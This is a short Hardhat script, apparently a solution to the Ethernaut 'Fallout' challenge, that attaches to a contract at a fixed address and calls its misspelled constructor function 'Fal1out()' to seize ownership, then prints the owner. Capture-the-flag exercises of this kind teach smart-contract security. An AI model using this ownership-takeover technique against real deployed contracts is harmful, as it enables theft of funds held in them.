import { ethers } from "hardhat";

async function main() {
    let [account] = await ethers.getSigners();

    let Fallout = await ethers.getContractFactory("Fallout");
    let fallout = Fallout.attach("0x2CA195C3477de453eCD33d66BECE02876426f97b");

    let tx = await fallout.Fal1out();
    await tx.wait();

    console.log(account.address);
    console.log(await fallout.owner());

}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });